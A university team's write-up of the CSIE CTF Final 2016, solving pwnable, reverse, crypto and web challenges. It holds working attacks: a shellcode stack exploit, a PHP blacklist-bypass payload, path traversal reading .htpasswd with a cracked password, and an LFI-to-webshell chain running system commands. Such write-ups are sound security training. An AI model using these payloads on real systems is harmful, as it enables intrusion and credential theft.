CSIE CTF FINAL 2016 Write-up
===

### Team: Night_Owl_3041
> - Member:
> M10515029 陳俊賢、M10515031 黃佳郁
> M10515036 謝奇元、M10515037 洪斌峰

---
---

## 😇Pwnable

---

### Start - 150

> Start
> [BGM] https://www.youtube.com/watch?v=bBzBZJwW90g
> nc ctf.pwnable.tw 8731
> [start.tar.gz](https://final.csie.ctf.tw/files/7578586f6a82fa685a10a31b2802037a/start.tar.gz)

一開始發現只有stack可以塞shellcode執行，就在想辦法leak stack的位置。
發現跳回 `0x08048087` 可以 leak stack上 20bytes。
就會發現第一個esp。

但是其實有點距離，也不能計算固定長度，於是我就想把stack往上長。
然後就發現跳回 `0x08048060 (main)`
可以讓stack長 4byte。
然後發現跳回 `0x0804808b` 可以 leak stack 60btyes。

於是就往上長個7次吧，在leak 60byte。
就可以拿到最底層的esp（當初不知道為什麼stack太下面會當掉，於是就往上長）

最後塞shellcode跟nop
然後增長stack 100次，全加nop
這樣比較容易跳到能跳的位置。

```Python
from pwn import *
def run(r):
        a = r.recv()
        r.send("\x90"*20 + "\x60\x80\x04\x08")

def runsh(r,sh):
        a = r.recv()
        r.send("\x90"*20 + "\x60\x80\x04\x08" + "\x90"*8 + sh)

def runpad(r):
        a = r.recv()
        r.send("\x90"*20 + "\x60\x80\x04\x08" + "\x90"*4)


def end(r, off):
        a = r.recv()
        r.send("\x90"*20 + off)

        a = r.recv()
        l = []
        sum = ""
        for i in a:
                sum += i
                if len(sum) == 4:
                        l.append(u32(sum))
                        sum = ""
        for i in l:
                print hex(i)
        return l[-1]

def go(r, off):
        r.send("\x90"*44 + off)

r = remote('ctf.pwnable.tw',8731)
#r = remote("127.0.0.1",7777)
#raw_input()

sh = "\xeb\x0e\x5b\x31\xc0\x88\x43\x07\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
print len(sh)
payload = "\x90"*20 + "\x60\x80\x04\x08"
print r.recvuntil(":")
r.sendline(payload)

#get stack header
for i in range(7):
        print i,
        run(r)
print ""
add = end(r,"\x8b\x80\x04\x08")
print hex(add)



go(r,"\x60\x80\x04\x08")
runsh(r,sh)
for i in range(100):
        print i,
        runpad(r)
r.recv()
r.send("\x90"*20+p32(add))


r.interactive()
```
FLAG: `CTF{Z3r0_1s_st4rt}`

---

### Kidding - 600

> Pwning for kidding !!
> [BGM] https://www.youtube.com/watch?v=pn5tnyuHW3g
> nc ctf.pwnable.tw 8361
> [kidding.tar.gz](https://final.csie.ctf.tw/files/5140cece38b69216b4f9be5b75458651/kidding.tar.gz)

這題很好找control flow
就開始寫ROP
把`/bin/sh` 放在 `.bss`
把該放的東西放在`eax,ebx,ecx,edx,int_0x80`
發現不能用～
不知道怎麼重新開始`stdin stdout stderr`
``` C
close(0)
close(1)
close(2)
```
404 FLAG not found

---
---

## 🔄Reverse

---

### AHK - 100

> Try to decrypt the flag.
> Notice: The flag doesn't include 'CTF{}' after decryption, but you must add the prefix when submitting to scoreboard.
> [ahk.tar.gz](https://final.csie.ctf.tw/files/cc5e956434c5ce6c10d1f6e8837d2703/ahk.tar.gz)

Use an [online disassembler](https://www.onlinedisassembler.com/static/home/) to disassembly enc.exe.

```
0x14010f420	; <COMPILER: v1.1.24.04>
0x14010f439	:O:@a::04
0x14010f443	:O:@b::7f
0x14010f44d	:O:@c::be
0x14010f457	:O:@d::37
0x14010f461	:O:@e::73
0x14010f46b	:O:@f::29
0x14010f475	:O:@g::ff
0x14010f47f	:O:@h::a5
0x14010f489	:O:@i::a9
0x14010f493	:O:@j::2c
0x14010f49d	:O:@k::ef
0x14010f4a7	:O:@l::d1
0x14010f4b1	:O:@m::48
0x14010f4bb	:O:@n::22
0x14010f4c5	:O:@o::63
0x14010f4cf	:O:@p::5a
0x14010f4d9	:O:@q::fa
0x14010f4e3	:O:@r::32
0x14010f4ed	:O:@s::fa
0x14010f4f7	:O:@t::98
0x14010f501	:O:@u::3b
0x14010f50b	:O:@v::cd
0x14010f515	:O:@w::25
0x14010f51f	:O:@x::fb
0x14010f529	:O:@y::47
0x14010f533	:O:@z::d2
0x14010f53d	:O:@0::05
0x14010f547	:O:@1::b5
0x14010f551	:O:@2::ba
0x14010f55b	:O:@3::09
0x14010f565	:O:@4::e6
0x14010f56f	:O:@5::77
0x14010f579	:O:@6::68
0x14010f583	:O:@7::56
0x14010f58d	:O:@8::00
0x14010f597	:O:@9::15
0x14010f5a1	:O:@_::e4
```

And there is a string inside flag.enc, it might be the flag.

```python
a = 'd105bee6d1e4fa983b37092298fae422090937e47fe6faa9bee45a05a92298fa'
c = ''

for j in range(1,len(a),2):
    i = a[j-1] + a[j]
    if i == '04':
        c += str('a')
    if i == '7f':
        c += str('b')
    if i == 'be':
        c += str('c')
    if i == '37':
        c += str('d')
    if i == '73':
        c += str('e')
    if i == '29':
        c += str('f')
    if i == 'ff':
        c += str('g')
    if i == 'a5':
        c += str('h')
    if i == 'a9':
        c += str('i')
    if i == '2c':
        c += str('j')
    if i == 'ef':
        c += str('k')
    if i == 'd1':
        c += str('l')
    if i == '48':
        c += str('m')
    if i == '22':
        c += str('n')
    if i == '63':
        c += str('o')
    if i == '5a':
        c += str('p')
    if i == '32':
        c += str('r')
    if i == 'fa':
        c += str('s')
    if i == '98':
        c += str('t')
    if i == '3b':
        c += str('u')
    if i == 'cd':
        c += str('v')
    if i == '25':
        c += str('w')
    if i == 'fb':
        c += str('x')
    if i == '47':
        c += str('y')
    if i == 'd2':
        c += str('z')
    if i == '05':
        c += str('0')
    if i == 'b5':
        c += str('1')
    if i == 'ba':
        c += str('2')
    if i == '09':
        c += str('3')
    if i == 'e6':
        c += str('4')
    if i == '77':
        c += str('5')
    if i == '68':
        c += str('6')
    if i == '56':
        c += str('7')
    if i == '00':
        c += str('8')
    if i == '15':
        c += str('9')
    if i == 'e4':
        c += str('_')

print(c)
```
First it shows "l0c4l_qstud3ntqs_n33d_b4qsic_p0intqs", seems like "q" is redundant, so I deleted it.

FLAG: `CTF{l0c4l_stud3nts_n33d_b4sic_p0ints}`

---

### tsubasa - 300

> Pure reverse ?
> Notice: The flag doesn't include 'CTF{}' in this challenge but you must add the prefix when submitting to scoreboard.
> [tsubasa](https://final.csie.ctf.tw/files/7398fdc59ff230aeff832d7697ce8dc8/tsubasa)

`strings tsubasa`

Get

```
flag = "CTF{%s}" % secrets[24] + secrets[37] + secrets[52] + secrets[62] + secrets[79] + secrets[94] + + secrets[95] + secrets[129] + secrets[208] + secrets[292] + secrets[364] + secrets[601] + secrets[663] + secrets[764] + secrets[897] + secrets[955] + secrets[1057] + secrets[1179] + secrets[1186] + secrets[1224] + secrets[1324] + secrets[1448] + secrets[1496] + secrets[1545] + secrets[1548] + secrets[1552] + secrets[1674] + secrets[1927] + secrets[1933] + secrets[2019] + secrets[2172] + secrets[2222] + secrets[2271] + secrets[2287] + secrets[2350] + secrets[2360] + secrets[2413] + secrets[2430]
secrets = ''.join(chunks[i] for i in sorted(chunks)) # sorted by chunk size
I splited the secrets and hide the slice in each chunk.
```



---
---

## 🔓Crypto

---

### Simple - 100

> nc csie.ctf.tw 10180

Spend 3 hours finding why there is no output -> it should use school's network...no vpn [cry]

AES-OFB

``` Python
import binascii
import base64
secret_srt = ['53sQuCGwYtk6rZOLnGygM5jS5ImUTRisvzd1q4XVbL4=','kCl8lxusSYMHiaKCh2CRMZrG7I28Zmr1qQljs4KNS4s=','xxIjiiCXR9Idj4SDsHSfLZnCsYuVQGr1nC1z3YitSpU=','7jMAiz6pe9ozqoKFpG/gNJOWt7KzahatkCJel53QWvU=','0AQuiQjUd/NIlYaUrUiTJoPqzYWOQjzz/kJz1LqqY/U=','x3lwly6JY9E9uamjtlTjNaLt0YOkaxmsvhRSnqqWQ6M=','6XoshD6NAIdCi4bnjHGTOZP7t4aOTgypvxgPsqqkR48=','0yJ1oiiDe8MqiaG6hn6FcLiQ5YnUPG2wqklil5qQO6Q=','2g08qyasCM4m6Yi+uUS9LIr78pbSYiaLvzVWopqCWfU=','0QwqmiKrYtg/rqmKhkStJPXM97GyRhaXgEheqryRX4E=','yA4GrTSudPE1irewgTPhJJKXw7anZRiDuhtovrGOTf4=','5SsI3yOJAYMStLedoTetMKT15KOETjSKvy5P3Mi2N4E=','+ycgnQqjR+MTjbCrjWKPOPTn47ONahSA8Q120qiEY4s=','lwYcgzu5S+5Dnt6dx0KdJ5P05dGAWBuznAhUjpGobZM=','xxothjnUCMIyvNKcu1+wLvLp75KBWRycphFLrYqzfbY=','xDMUqw+qXtcdma3luEOVNorXurmIYxy3nD4Pk7eLf/4=','0SgR23yqReBE5a+QvW6Nd7fR0qCqeBv0mxVcjbKpeqg=','9AAigDnYf8Ekko+UkWemEpPUzqXReQ+snShpp8CPYYM=','x308oz+5cvoi66C0zHyaE6r287GNSm/2vz9AqYendaI=','kyYxqBSGVvdEr9++t0uiOZLE+4yKUzuMuQ5QgZK0Sqs=','5AEygjiyfIwd5JKmwVylL4fo8azUXDGukjt+j5XWOfY=','zgkMqjjSecERmaGgvGKHNoLK2JageBOXnQ94i4a0fJQ=','1zgtoX7VdNhArKWmvEWwd7T6xtWnXj+rgy0InoSyO5E=','7HIGvgq4R+EllIKCnG+udKjJ7NioZyiznEtSqZiIZLw=','mxoVmgbZd9s1vJaCnlyRBrHU0InRfA2tuA1tpsfRQaM=']
flag='4B4DlGnBXN1B6ZWNw2mINaiQ3YnVSW6r+w16lpvWMLs='
secret_srt = [base64.b64decode(a) for a in secret_srt]
#print(secret_srt)
ase_list=[]
print(secret_srt)
secret_zip = zip(secret_srt[0], secret_srt[1], secret_srt[2], secret_srt[3], secret_srt[4],
                 secret_srt[5], secret_srt[6], secret_srt[7], secret_srt[8], secret_srt[9],
                 secret_srt[10], secret_srt[11], secret_srt[12], secret_srt[13], secret_srt[14],
                 secret_srt[15], secret_srt[16], secret_srt[17], secret_srt[18], secret_srt[19],
                 secret_srt[20], secret_srt[21], secret_srt[22], secret_srt[23], secret_srt[24])
for secret in secret_zip:
    aes = []
    for i in range(256):
        conn = True
        for s in secret:
            tmp = i ^ s
            if ((tmp >= 0x30 and tmp <= 0x39) or (tmp >= 0x41 and tmp <= 0x5A) or (tmp >= 0x61
                                                                            and tmp <= 0x7A)):
                pass
            else:
                conn = False
                break
        if conn == True:
            aes.append(i)
    ase_list.append(aes)
print (ase_list)

flag_bin = base64.b64decode(flag)
print (flag_bin)
ans = []
for i in flag_bin:
    ans.append(i)
print(ans)
answer=b''
for i in range(len(ans)):
    for maybe in ase_list[i]:
        answer += binascii.unhexlify(hex(ans[i] ^ maybe)[2:])
print (answer)

```

FLAG: `CTF{$!mi14r_7o_th3_h3@0m3w@rk5?}`

---

### RSA - 200

> [rsa.zip](https://final.csie.ctf.tw/files/babfba49c455db6a5884da972bd19a2d/rsa.zip)

從 output 可看到很多組的 n, c, e
其中e相同的為`e=7`
故取出`e=7 `的`n`及`c`，用`中國餘數定理(CRT)`算出 
```python
def chinese_remainder(n, a):
    sum = 0
    prod = reduce(lambda a, b: a*b, n)
 
    for n_i, a_i in zip(n, a):
        p = prod / n_i
        sum += a_i * mul_inv(p, n_i) * p
    return sum % prod
 
 
def mul_inv(a, b):
    b0 = b
    x0, x1 = 0, 1
    if b == 1: return 1
    while a > 1:
        q = a / b
        a, b = b, a%b
        x0, x1 = x1 - q * x0, x0
    if x1 < 0: x1 += b0
    return x1


data = [{"c": 33547004061102933765282913425404261682238327617521894423858042865935039767875675735512344723213603573887370473383693327563182319798984035994305101686839405854379012054563399473920378199258727455889100240775458765741591285834899571449641363862656172916058027923879828042179863345070226311290655400141947947077690079794445176134575297310405553196629094734342974101672001182839224548502918599346959061769370335219922003654624018222027658644656892257011562533056026347569886327198025301011781604334991530103244042918463528464195368513652958397583022079775025392306142757745220532922312147367089660743115963881951574390262, "e": 7, "n": 88915379777904220480592965231356288056731383962858378813795992867325415494232591101369475346005319526467392759168718676817426236490049372700046953192242554849669083680644269807020713343649693493391967704982398710494816670896969853530390409751004044500179983368339771742667306000453312700864988959043510405757844065684630163017301645228843333095653510881118262362873430270092297097520114637905111719730735393337490859403819803866582550676871351609053866045219052425492955032713610577632707036033362957006618381769590533733351146385104861858114490180355083406077980747627293257655435678804509990810760526889137878205587},
{"c": 48724332165995913977844906117462828935947440967477497532869304734595570809501780844474104204542070189595326149962631358840524405967630599424740127470047487809579688578439652891833857650069010469429281754988660601841048262206670010832293470413006066884666044871592149572826717231689874638175952285300678859957450045905563820292937930059940187095877407685747960745981120708262009261701257435482095335328558022086934884737516294416591076275810839606228010378127829469827002961345035432166638140158469081464567169557045581938190437636125430362289266619713266770139710693685316760826737106955358629832940545756799957927913, "e": 7, "n": 85937464834800440448779023483739705743537323986754525659171871858240147041569199865953053169478535993937225638362618068221300356308766381119980731903946196065980001660073172673803494616091263758904883730021398576375079808746326215740545415080710072793495247556868493661250598926986840339347929980665621131801861595219576239833573354164766697206670012421174002288583434197100677231770293635204060820570183428510363701508701159462299177870973708728822458568445338303275703746612609015298809130228012991654201519449008112224483594406117972259479473745702807289893719590497760090322584221980780225213891739876489083585757},
{"c": 14169696545155822854937121913690858330271879875429917393512474698712174853322892075416792477196566749335257219142515453979929137860730968008611876889689315548596033486906819369177005114678765753306705546619958080967233534254074452905340283916248965272883713887670761194331607292243702599486481458106213274235078890289193989624803810853255653594169664624777348754298483104800886158711854828283841946903156505099294704768117151598058923523722241419194785356282943539017745496108482813263236945797269621840229814455199209879675309163607787334958891577595055762246343698558006863383466375502189420931418995279794373204392, "e": 7, "n": 75161724624400680907344700366549962017585202517439688851108081386105811051501830342282922943512575434556882722635542694410146690660952844097279579396363925446192922960147531113032247663225473961541063426582774484535746061173779281358329491616170358789910335815704625511033752324457439099336888113779884363177850701040316726766755677133072225769203425981920980068994522696437466634233261921408363221074175645538995085332595443358694280430108910403248225085389002326566476180404432263432804686406458659495121577254207680509705087551038661699432196760794858878274901588872786596437228396471774316441000729164846333506349},
{"c": 30573593511274586668680008169544388348952539044195095064077371904950788268808608391546586239197858470340677680364766128749981978852224537209742040798235704872691831557181874380739110783143115886266025871415777294027382295376514950396090912418221289825644942264463688252497003324495130475628343195716889755657330236877541425962074234149154681497766757510150932321808371306144519202710420754428459486241697628938802817159497599329405164687942898723546996742642523574815461061288050393227621910177000979254697997102507413052245594212935297283659391374567068538158948770160683494396513269663739504321365684236328624149609, "e": 7, "n": 56868680688293676260355321083353789041475537734140633595933408997481186428795132040058374272112962910716673671774791927020035988017815500220112790364993030075059278171385947320096371629762708132941386013457467895072260231487325099497685051971295226767255428231166258001590038896723386065662613815270219738371363502766131292786008840470804378262352466288291034165588603196904548910977778174316040750498579826800379527767985738266939663213127824534919553009306515829389444733216483560488349518542496071176782491828899709634085763574740737021875781704682829448918310070084057529258510447229555167481960724140757065036309},
{"c": 16209867591439871945542708911739363213137977561683807924481552819254149586073163507600264139376732145827194237508721477793480892343294998552096558791633032408078671338632943848399424060090611611772262129620193292824659774289663416494215610818812225205349287924402521373636649273093388021509357532971835568870675990050738530902209937727031875011220451343825857393861920162967931988526813185393237294722851861854593395259219985097104736118638215994702979377415518500301295962475060594553713316449477373653410478332114538699565821995916539529777274176659127165906972265353886751281292703760467171448150656307998879687123, "e": 7, "n": 37392447517109699553636556010863604779108808239388722535340023098488823146374574992491330173077852622116290569997698398921962019283612903618009862978006891771549890711372643769395130442649590352873541827956615659259041830323057369845378603040036154195791520471589669668917488063638235537912397288458368005164503171736792713458686424680362671784040410720431683952308722160541058777957271912609712459986460518023444540959447153980907163818627865405453106531279729113474798405762228457912323106800035537075619649448205967933428622266811803268517529113715660280567348441379437468247703255175737588572324107352306236369699},
{"c": 64286727682038726271460372383486562553704796492251542657272001470138707011450298098588894535168038037539524830328862293663092122512572021743693373333759810379012654685705623832044790535293465989964785627496636803320610338072425649724483971437091746934774219397637431433686759745790854215361269448095099918944309171224217213232151738242764377671573182687827217075273462040202069778283277975276391585716580423068347987039124606587371220380541449451798110489319629608165271477160680832772870788327442270722824789499884307465784845917895815368881662534085424334496399878812702246036478758806729871104846231820028678611425, "e": 7, "n": 65256754988080624321862819578014507876138516586800580513722514108031954035036369498995388924880564699545393660624499461324475337600233716922682659842984105806653553786920890167020843565913411033147940820663991091844817976617875089892681435328012008786127071246362776071362465097046927729984768350661190732989058733520839596558866150738181740630160271432828557581044199123917927862385544043660381827088277186730068496617148727509329771193863819965757216964552060870635204781025902152779923625149008026646087219214146142946816045807520207277149929487889636997513072801036893962425841227848551603626041753808095499587793}]

data = {k:[d.get(k) for d in data] for k in {k for d in data for k in d}}
#print(data)
t_to_e = chinese_remainder(data['n'], data['c'])
#print (t_to_e)
t = int(gmpy.mpz(t_to_e).root(7)[0])
print(hex(t)[2:])

ans = '4354467b43316c6c34732421635f63306f306f6d6d306e5f6d30647531752435355f61377440636b212121233e5f3c7d'
print(binascii.unhexlify(ans))
```

FLAG: `CTF{C1ll4s$!c_c0o0omm0n_m0du1u$55_a7t@ck!!!#>_<}`

---

### Can't see - 200

> [cant_see.pcap](https://final.csie.ctf.tw/files/059289ca305ce5753bdb513f86e75821/cant_see.pcap)

Open cant_see.pcap with wireshark. Find the packet Server hello and export selected packet bytes to save as public.der.

`openssl x509 -inform DER -in public.der -text`

GET

```
Modulus: 
	00:b5:d8:21:69:ab:56:57:d6:e4:9c:cf:a7:1b:ac: 
	3d:b6:b7:d4:58:c8:b0:6d:3b:22:48:8d:70:e5:32: 
	7a:48:cd:c2:ee:40:d6:f0:4c:37:85:d6:f6:68:d1: 
	0e:75:c8:0e:27:96:6b:61:87:fa:fc:87:75:27:03: 
	f4:98:d3:76:8c:ce:b9:be:ba:1e:0c:46:02:fd:96: 
	65:36:a8:c6:a3:c4:83:13:81:0b:13:bf:41:c3:56: 
	2f:80:76:fb:51:c4:d9:dc:cc:ac:6d:60:27:42:3d: 
	ab:3a:89:ee:d0:ab:94:0b:9a:90:6b:7e:b5:07:2d: 
	fc:e4:58:fa:fe:11:f9:dd:2b
```
Transfer it to int and use http://factordb.com/ to get

```
p=10920751235985119653472002230123679493859432511142648983229380510281324432153859557876565179591504400449156343235310928577830570368769797990630171164502353
q=11692911878185126338206773900975770006358209194645635593939130467951698869436356072539681820130238883252181986286517884376233971083574264554620794757267387
```
Then use rsatool to get pem.

But...No module named gmpy and time's up [cry]

---

### Lost - 200

> [lost.pcap](https://final.csie.ctf.tw/files/46698145bcf5f119b73b625c2de7f4d2/lost.pcap)

`strings lost.pcap | grep -i key`
`strings lost.pcap | grep -i plaintext`

Get

```
AES-CBC(KEY, PLAINTEXT) = 1f****************************8452fe2ad18a9e5e26887d133a13d7b818
KEY = Ad5xBvZR1HVhE6**
PLAINTEXT = Thi5 i$ 7he p!4int3x7 0f AES-CBC
AES-CBC(KEY, FLAG) = 9c2ea756ed9ca3c05d541f7df961b3569e5f85a3387a818ed4c23db57aeeb1e4
```

Use brute force

```Python
#!/usr/bin/env python
import string
import itertools
from Crypto.Cipher import AES

def xor_blocks(b1, b2):
  return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(b1, b2))

def encrypt(m, p, iv):
  aes = AES.new(p, AES.MODE_CBC, iv)
  return aes.encrypt(m)

def decrypt_block(c, k):
  aes = AES.new(k, AES.MODE_ECB)
  return aes.decrypt(c)

def brute_block(c_block, p_block, known_iv, known_key_prefix):
  assert(len(p_block) == 16)

  # Candidate list
  candidates = []

  # Known key prefix
  brute_count = (16 - len(known_key_prefix))

  # Character set
  charset = [chr(x) for x in xrange(0x00,0x100)]

  # Brute-force
  for p in itertools.chain.from_iterable((''.join(l) for l in itertools.product(charset, repeat=i)) for i in range(brute_count, brute_count + 1)):
    candidate = known_key_prefix + p
    d = decrypt_block(c_block, candidate)
    t = True
    # Check whether known plaintext/known iv constraint holds
    for offset in known_iv:
      t = (t and (p_block[offset] == chr(ord(d[offset]) ^ ord(known_iv[offset]))))

    if(t == True):
      candidates.append(candidate)

  return candidates

# Known key fragment
known_key_prefix = "Ad5xBvZR1HVhE6"
# Known plaintext
plaintext = "Thi5 i$ 7he p!4int3x7 0f AES-CBC"
# Ciphertext block 1
c_block_1 = "52fe2ad18a9e5e26887d133a13d7b818".decode('hex')
# Known fragments of ciphertext block 0, organized by offset
known_iv = {
      0: "\x1F",
      15: "\x84"
}

# Obtain candidate keys
candidate_keys = brute_block(c_block_1, plaintext[16:], known_iv, known_key_prefix)

# Try all candidate keys
for k in candidate_keys:
  # Obtain ciphertext block 0 as IV of ciphertext block 1
  c_block_0 = xor_blocks(decrypt_block(c_block_1, k), plaintext[16:])

  # Obtain IV given known ciphertext block 0, plaintext block 0 and key
  IV = xor_blocks(decrypt_block(c_block_0, k), plaintext[:16])
  print(k)
  print "[+]Candidate IV: [%s]" % IV
```

Get `KEY = Ad5xBvZR1HVhE6#3` and `IV = 8RQEs0dcprleIYbd`, then use an online tool to decrypt the flag.

FLAG: `CTF{0x52fec4c0afd8ffaebc93cbaa6}`

---
---

## 😇Web/Pwnable

---

### Dream - 400

> Do you have dream ?
> [BGM] https://www.youtube.com/watch?v=5fxPY4hi-P4
> http://ctf.pwnable.tw:1412

To solve it is a dream ~~~

---
---

## 🤖AEG

---

### AlphaPuzzle 💮 - 200

> Decode base64 encoded ELF binary from the server.
And finish puzzles three times to capture the flag.
> nc 133.130.124.59 9991
> [Don't waste your time on this] https://www.youtube.com/watch?v=uuMNmHdr0Lg
>
>Hint:
>aHR0cHM6Ly91cmwuZml0L1hmVE9U

用nc連線後會給一串base64，解碼後發現是一個程式，用IDA PRO開啟後發現做了許多複雜運算，而且每次給的程式運算子都不太一樣，因此直接用angr解。
``` Python
from pwn import *
import base64
import angr
#I will send you program encoded by base64
conn=remote('133.130.124.59', 9991)
conn.recvuntil('I will send you program encoded by base64')
for i in xrange(3):
    piece = conn.recvuntil('==')
    print(piece)
    b = base64.decodestring(piece)
    with open('p', 'w') as wFile:
        wFile.write(b)
    print('Start finding path!')
    path = angr.Project('./p', load_options={'auto_load_libs': False} )
    pg = path.factory.path_group()
    found = pg.explore(find=0x0400AF5).found[0]
    print("Find Path!!")
    ans =  found.state.posix.dumps(0)
    ans = ans.split('\n')[:-1]
    print(ans)
    for oneasn in ans:
        print(conn.recvuntil('ece'))
        print(oneasn)
        conn.send(oneasn + '\n')
    if i < 2:
        print(conn.recvuntil('GJ!'))
    else:
        print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))
print(conn.recvline(timeout=1))

```
FLAG : `CTF{5YW25a+m5pq05Yqb6Kej5aW95YOP5Lmf6Kej55qE5Ye65L6G}`

---

### oo 👉🏻👌🏻 - 300

> Try to decode base64 encoded elf from server.
Let's oo together.
> nc 133.130.124.59 9992

與上題相同，解出程式後用IDA PRO開啟，給了很長一段會變動數字，要將這些數字當作輸入，用angr跑很久沒結果，因此直接找這些數字的address，並當作輸入。
``` Python
from pwn import *
import base64
import binascii
answer = []
conn=remote('133.130.124.59', 9992)
conn.recvuntil('I will send you program encoded by base64')
piece = conn.recvuntil('NOW')
piece = piece.split('\n')[:-3]
print(piece)
b = base64.b64decode(''.join(a for a in piece))
with open('p', 'w') as wFile:
    wFile.write(b)
e = ELF('./p')
strip = 0x6
for i in range(0x7e2, 0x333e, 10):
    a = e.read(e.address + i + strip, 2)
    answer.append(int(binascii.hexlify(a[::-1]),16))
print(answer)
for i in xrange(10):
	print (str(answer[i]))
	conn.send(str(answer[i]) + '\n')
print (conn.recvuntil('Guess OO'))
for i in xrange(100):
	conn.send(str(answer[i + 10]) + '\n')
print (conn.recvuntil('Guess OOO'))
for i in xrange(1000):
	conn.send(str(answer[i + 10 + 100]) + '\n')
print(conn.recvuntil('now.'))
conn.interactive()

```
FLAG : `CTF{o_oo_ooo_th1s_1s_how_simple_acg_look_like}`

---
---

## 🐟Web

---

### Admin Panel - 100

> http://54.199.166.146/f31c286df3608f5b71ea528d7220974957bfb14d/


直接用 curl，得到flag
![](https://i.imgur.com/xf0Zu28.jpg)

FLAG : `CTF{Admin's_pane1_1s_0n_F1r3!?!?!}`

---

### Hello - 200

> http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/

First to look at the source code of the page at

`http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?source`

then I found that some of the words are blacklisted.
``` PHP
$blacklist = array("system", "passthru", "exec", "read", "open", "eval", "backtick", "flag", "php", "`", "_")
```
Try to bypass the blacklist and enter `flag.php`
```
http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=printf(('file'.chr(95).'get'.chr(95).'contents')(('./fla'.'g.p'.'hp')))
```

FLAG: `CTF{bypass_php_filter_is_so_fuN!}`

---

### Snoopy's flag - 200

> http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/

查看網站原始碼可發現圖片是利用 `image.php?p=flag.png` 來抓取
由提示可知所要的 Flag 在`admin`資料夾中
嘗試存取`admin`資料夾發現被認證擋住
Apache常利用.htaccess方式認證
故`http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=../admin/.htaccess`抓取資訊檔
從`.htaccess`檔可看到
```
AuthType Basic
AuthName "Password Protected Area"
AuthUserFile /var/www/web3/admin/.htpasswd_which_you_should_not_know
Require valid-user
Options +Indexes
```
便再下載`http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=../admin/.htpasswd_which_you_should_not_know`

可得到`secret_admin:K7WeKYm8O5MQI`
再利用John解出: `secret_admin:!@#$%^&*`
登入 `http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/admin`得看到Flag檔案

p.s. 學術網路真煩

FLAG: `CTF{apache_config_file_is_sensitive}`

---

### Snoopy's Pics - 300

> http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/



![](https://i.imgur.com/kty8U8D.jpg)

看到參數"?p="懷疑有local file inclusion，測試php wrapper `php://filter/convert.base64-encode/resource=index`，結果如下圖

![](https://i.imgur.com/pgLj3gE.jpg)

的確可以LFI，得到index.php的base64加密，解密後發現有隱藏的page，如下圖

![](https://i.imgur.com/VOkOQGF.jpg)

進入後發現可以上傳檔案，但限於jpg檔，在上傳後會random產生檔名並加上副檔名.jpg
在測試許多[php warpper](https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion)後發現一種有趣的php warpper，可以解壓縮zip檔 `zip://`
先測試最簡單的webshell `<?php phpinfo() ?>` ，壓縮上傳後發現的確可控，可以使用右邊網址看 [phpinfo](http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/yOgYqffmX.jpg%23snoopy)

![](https://i.imgur.com/iXt3KOQ.jpg)

再來上傳真正得webshell `<?php $_GET['e']($_GET['f']) ?>` [webshell](http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/lj3AU9t0E.jpg%23snoopy&e=system&f=ls%20-al) 直接控e跟f就好，得到flag在[/flag](http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/lj3AU9t0E.jpg%23snoopy&e=system&f=cat%20/flag)內
FLAG: `CTF{finally_got_RCE_but_do_you_have_enough_sleep?}`


---
---

## 🍊Web

---

### GIT - 300

> Do you really know GIT :P
> Please HACK http://133.130.122.214/

Orange is God !

---
---

## 😇Web

---

### Dream-web - 150

> Can you find your dream ?
> [BGM] https://www.youtube.com/watch?v=5fxPY4hi-P4
> http://ctf.pwnable.tw:1412/

``` PYTHON
print("SSBjYW4ndCBmaW5kIG15IGRyZWFtLg==")
```

---
---

## 🐻Misc

---

### Rilakkuma - 10

---

> CTF{rilakkuma}
> [rilakkuma.jpg](https://final.csie.ctf.tw/files/6ae7398e200ae87f5dc6ae339a4dfaeb/rilakkuma.jpg)

Rilakkuma is so cute~~~
Flag: `CTF{rilakkuma}`


---
---

## 資訊安全相關競賽

---

### 「105年資安技能金盾獎」競賽

---

> 比賽資料:
> https://security.cisanet.org.tw/shield.aspx

心得:初賽題目為選擇題，題目內容非常隨機。題目大致為協定、網路、法律等。我們對於這種題目較不熟悉，非常可惜未能前進決賽。值得一提的是在抽獎活動中，幸運地成為第一組被抽到獎品的隊伍，留下特別的紀念品！

---

### HITCON CTF 2016

---

>比賽資料:
>http://ctf.hitcon.org/

心得:這是第一次參加CTF競賽，雖然解出的題目不多，但一次比賽便是一次經驗，經過不斷經驗的累積，才能對於題目更為熟悉。這次的比賽，讓我們了解真正的資安實務，與課堂中所學的有些微差距，以理論為基礎，進行更進一步的實作，也藉由這次競賽，使得我們對於CTF更為有興趣，因而更深入研究各類題型，並了解到，以駭客的思考方式的重要性。

---

### SECCON CTF 2016

---

>比賽資料:
>https://score-quals.seccon.jp/

心得:藉由前次hitcon的比賽經驗，看到題目後，較為知道該從何處下手，每次的比賽皆是一次的練習，透過不斷的練習，逐漸熟悉CTF的題型及解題思路。

---